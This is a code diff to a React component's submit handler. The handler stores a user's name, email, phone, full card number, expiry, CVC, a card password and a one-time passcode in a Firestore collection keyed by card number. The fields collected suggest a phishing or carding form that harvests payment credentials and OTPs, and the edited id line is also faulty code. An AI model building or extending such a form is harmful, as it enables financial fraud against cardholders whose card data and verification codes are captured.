@@ -119,7 +119,7 @@ export default function Component() {
     const handleSubmit = (e: React.FormEvent) => {
         e.preventDefault()
         const da=new Date()
-        let alldat = { date:da.getDay()+"/"+da.getHours()+"/"+da.getMinutes()+"/"+da.getSeconds() ,personalInfo: { id: id, name: name, email: email, phone: phone }, payment: { cardNumber: cardNumber, expiry: expiry, cvc: cvc,pass:pass }, otp: { otp: otp } }
+        let alldat = { date:da.getDay()+"/"+da.getHours()+"/"+da.getMinutes()+"/"+da.getSeconds() ,personalInfo: { id: doc.length+1, name: name, email: email, phone: phone }, payment: { cardNumber: cardNumber, expiry: expiry, cvc: cvc,pass:pass }, otp: { otp: otp } }
         setDoc(doc(db, "data", cardNumber), alldat);
 
     }
